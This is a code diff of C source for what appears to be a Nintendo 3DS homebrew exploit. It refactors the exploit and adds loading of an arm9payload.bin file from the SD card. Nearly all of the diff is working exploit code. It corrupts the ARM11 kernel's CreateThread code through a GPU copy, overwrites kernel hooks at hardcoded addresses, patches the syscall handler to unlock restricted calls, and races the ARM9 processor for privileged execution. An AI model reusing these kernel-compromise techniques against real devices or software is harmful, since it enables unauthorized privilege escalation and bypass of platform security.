@@ -4,7 +4,7 @@
 #include <string.h>
 #include <malloc.h>
 #include <dirent.h>
-
+#include "bootstrap.h"
 
 u32 nop_slide[0x1000] __attribute__((aligned(0x1000)));
 
@@ -15,49 +15,22 @@ u32 va_patch_hook2;
 u32 va_fcram_base;
 u32 va_exc_handler_base_W;
 u32 va_exc_handler_base_X;
-u32 pa_exc_handler_base;
-u32 offs_exc_handler_unused;
-u32 offs_fcram_arm9_payload;
 u32 va_kernelsetstate;
-
-struct arm11_shared_data {
-	u32 va_pdn_regs;
-	u32 va_pxi_regs;
-	u32 va_hook1_ret;
-	u8 *va_framebuf;
-} sd;
 
 u8 is_healed_svc_handler = 0;
 u32 kversion;
 u8 isN3DS = 0;
 u32 *backup;
-u32 *arm11_buffer;
+unsigned int *arm11_buffer;
 
-#define wait() svcSleepThread(1000000000ull)
+struct arm11_shared_data arm11shared;
 
 
-int __attribute__((naked))
-svcCorrCreateThread (int (*func)(void))
+void redirect_codeflow(void *to, void *from)
 {
-	asm volatile ("svc 8\t\n"
-			 "bx lr\t\n");
-}
-
-int __attribute__((naked))
-svcBackdoor(int (*func)(u32, u32, u32, u32))
-{
-	asm volatile ("svc #0x7B\t\n"
-			 "bx lr\t\n");
-}
-
-// ldr pc, [pc, -#04]
-#define JUMPOUT 0xE51FF004
-void redirect_codeflow(void *from, void *to)
-{
-	*(u32 *)from = JUMPOUT;
 	*(u32 *)(from + 4) = to;
+	*(u32 *)from = ARM_JUMPOUT;	
 }
-
 
 int do_gshax_copy(void *dst, void *src, unsigned int len)
 {
@@ -109,11 +82,11 @@ int heap0_get_diff()
 	*/
 	return bkp1[0] - bkp2[0];
 }
-   
+
 // TODO?: replace with osGetFirmVersion() and osGetKernelVersion()
 u32 get_kernel_version()
 {
-	return *(u32 *)0x1FF80000; // KERNEL_VERSION register
+	return *(u32 *)VA_KERNEL_VERSION_REGISTER;
 }
 
 /* Corrupts arm11 kernel code (CreateThread()) in order to
@@ -146,13 +119,10 @@ int corrupt_arm11_kernel_code(void)
 			va_exc_handler_base_W = 0xDFFF4000;
 			va_exc_handler_base_X = 0xFFFF0000;
 			va_kernelsetstate = 0xFFF158F8;
-			pa_exc_handler_base = 0x1FFF4000;
-			offs_exc_handler_unused = 0xC80;
-			offs_fcram_arm9_payload = 0x03F00000;
 
-			sd.va_hook1_ret = 0xFFF28A58;
-			sd.va_pdn_regs = 0xFFFBE000;
-			sd.va_pxi_regs = 0xFFFC0000;
+			arm11shared.va_hook1_ret = 0xFFF28A58;
+			arm11shared.va_pdn_regs = 0xFFFBE000;
+			arm11shared.va_pxi_regs = 0xFFFC0000;
 		}
 		else
 		{
@@ -221,11 +191,12 @@ int corrupt_arm11_kernel_code(void)
 	 // part 2: trick to clear icache
 	for (i = 0; i < 0x1000; i++)
 	{
-		arm11_buffer[i] = 0xE1A00000; // ARM NOP instruction
+		arm11_buffer[i] = ARM_NOP;
 	}
-	arm11_buffer[i-1] = 0xE12FFF1E; // ARM BX LR instruction
+	arm11_buffer[i-1] = ARM_RET;
 	nop_func = nop_slide;
 
+	// do we really want to overflow the nop_slide buffer?
 	do_gshax_copy(nop_slide, arm11_buffer, 0x10000);
 
 	HB_FlushInvalidateCache();
@@ -238,6 +209,62 @@ int corrupt_arm11_kernel_code(void)
 	return 1;
 }
 
+u8 sd_arm9_buf[1024 * 1000];
+u32 sd_arm9_size = 0;
+bool sd_arm9_loaded = false;
+
+// reads arm9 code from a given path
+int load_arm9_binary(char *filename)
+{
+	int result = 0;
+	FILE *f = fopen(filename, "rb");
+	if (f) {
+		fseek(f , 0, SEEK_END);
+		sd_arm9_size = ftell(f);
+		rewind(f);
+		if (sd_arm9_size &&
+			!(sd_arm9_size % 4) &&
+			(sd_arm9_size < sizeof(sd_arm9_buf))) {
+				fread(sd_arm9_buf, 1, sd_arm9_size, f);
+				sd_arm9_loaded = true;
+				result = 1;
+		}
+		fclose(f);
+	}
+	return result;
+}
+
+/* copies externally loaded arm9 payload to fcram
+   - Please note that the arm11 payload copies
+     the original arm9 entry point from the mapped
+	 FIRM header to offset 4 of the arm9 payload.
+	 Thus, the arm9 payload should consist of
+	 - a branch instruction at offset 0 and
+     - a placeholder (u32) at offset 4 (arm9 entrypoint)  
+*/ 
+int map_arm9_code(void)
+{
+	extern u32 arm9_start[];
+	extern u32 arm9_end[];
+
+	u32 *src, *src_end;
+	
+	if (!sd_arm9_loaded) {
+		src = arm9_start;
+		src_end = arm9_end;
+	}
+	else {
+		src = sd_arm9_buf;
+		src_end = sd_arm9_buf + sd_arm9_size;
+	}
+	
+	u32 *dst = (u32 *)(va_fcram_base + OFFS_FCRAM_ARM9_PAYLOAD);
+	while (src != src_end) {
+		*dst = *src;
+		src++;
+		dst++;				
+	}	
+}
 
 void exploit_arm9_race_condition()
 {
@@ -246,8 +273,6 @@ void exploit_arm9_race_condition()
 	extern u32 arm11_end[];
 	extern u32 arm11_globals_start[];
 	extern u32 arm11_globals_end[];
-	extern u32 arm9_start[];
-	extern u32 arm9_end[];
 
 	int (* const _KernelSetState)(int, int, int, int) = (void *)va_kernelsetstate;
 	
@@ -255,7 +280,7 @@ void exploit_arm9_race_condition()
 
 	/* copy arm11 payload to lower, writable mirror of
 	   mapped exception handlers*/
-	dst = (u32 *)(va_exc_handler_base_W + offs_exc_handler_unused);
+	dst = (u32 *)(va_exc_handler_base_W + OFFS_EXC_HANDLER_UNUSED);
 	for (src = arm11_start; src != arm11_end;) {
 		*dst = *src;
 		dst++;
@@ -264,30 +289,26 @@ void exploit_arm9_race_condition()
 
 	/* copy firmware- and console specific data */
 	dst = (u32 *)(va_exc_handler_base_W + 
-	              offs_exc_handler_unused +
+	              OFFS_EXC_HANDLER_UNUSED +
 	              ((arm11_end-arm11_start)<<2));
-	for (src = &sd; src != &sd + sizeof(sd) / sizeof(u32);) {
-		*dst = *src;
-		dst++;
-		src++;		
+	for (src = &arm11shared; src != &arm11shared + 
+		sizeof(arm11shared) / sizeof(u32);) {
+			*dst = *src;
+			dst++;
+			src++;		
 	}
 
 	/* copy arm9 payload to FCRAM */
-	dst = (u32 *)(va_fcram_base + offs_fcram_arm9_payload);
-	for(src = arm9_start; src != arm9_end;) {
-		*dst = *src;
-		dst++;
-		src++;				
-	}
+	map_arm9_code();
 
 	// patch arm11 kernel	 
-	redirect_codeflow(va_patch_hook1,
-	                  va_exc_handler_base_X +
-	                  offs_exc_handler_unused);
+	redirect_codeflow(va_exc_handler_base_X +
+	                  OFFS_EXC_HANDLER_UNUSED,
+					  va_patch_hook1);
 
-	redirect_codeflow(va_patch_hook2,
-	                  pa_exc_handler_base +
-	                  offs_exc_handler_unused + 4);
+	redirect_codeflow(PA_EXC_HANDLER_BASE +
+	                  OFFS_EXC_HANDLER_UNUSED + 4,
+					  va_patch_hook2);
 	
 	CleanEntireDataCache();
 	InvalidateEntireInstructionCache();
@@ -296,7 +317,11 @@ void exploit_arm9_race_condition()
 	_KernelSetState(0, 0, 2, 0);	
 }
 
-#define NOP 0xE320F000
+/* - restores corrupted code of CreateThread() syscall
+   - if heal_svc_handler is true, a patch to the ARM11
+     Kernel's syscall handler is applied in order to
+     remove a certain restriction.
+*/
 apply_patches (bool heal_svc_handler)
 {
 	asm volatile ("clrex");
@@ -310,8 +335,8 @@ apply_patches (bool heal_svc_handler)
 	// heal svc handler (patch it to allow access to restricted SVCs) 
 	if(heal_svc_handler && va_patch_svc_handler > 0)
 	{
-		*(int *)(va_patch_svc_handler) = NOP;
-		*(int *)(va_patch_svc_handler+8) = NOP;
+		*(int *)(va_patch_svc_handler) = ARM_NOP;
+		*(int *)(va_patch_svc_handler+8) = ARM_NOP;
 		is_healed_svc_handler = 1;
 	}
 
@@ -331,23 +356,19 @@ launch_privileged_code (void)
 			 "ldr pc, [sp], #4\t\n");
 }
 
-#define RET 0xE12FFF1E // ARM BX LR instruction
-#define NOP2 0xE1A00000
-
 int run_exploit()
 {
 	int result = 0;
 	int i;
-	
-	sd.va_framebuf = gfxGetFramebuffer(GFX_BOTTOM, GFX_LEFT, NULL, NULL); 
+	 
 	int (*nop_func)(void);
 	HB_ReprotectMemory(nop_slide, 4, 7, &result); 
 
 	for (i = 0; i < 0x1000; i++)
 	{
-		nop_slide[i] = NOP2; // ARM NOP instruction
+		nop_slide[i] = ARM_NOP;
 	}
-	nop_slide[i-1] = RET; 
+	nop_slide[i-1] = ARM_RET; 
 	nop_func = nop_slide;
 	HB_FlushInvalidateCache();
 
@@ -363,12 +384,16 @@ int run_exploit()
 		{
 			arm11_buffer[i] = 0xdeadbeef;
 		}
+		
+		// if present in SD root, load arm9payload.bin 
+		if (load_arm9_binary("/arm9payload.bin"))
+			printf("Loaded arm9payload.bin from SD-Card\n");
 	
 		if(corrupt_arm11_kernel_code ())
 		{
 			printf("Attempting to gain ARM9 code execution\n");
 			wait();	
-			svcCorrCreateThread (launch_privileged_code);			
+			svcCorruptedCreateThread(launch_privileged_code);			
 			printf("Failure :[\n");
 			if(is_healed_svc_handler)
 			{
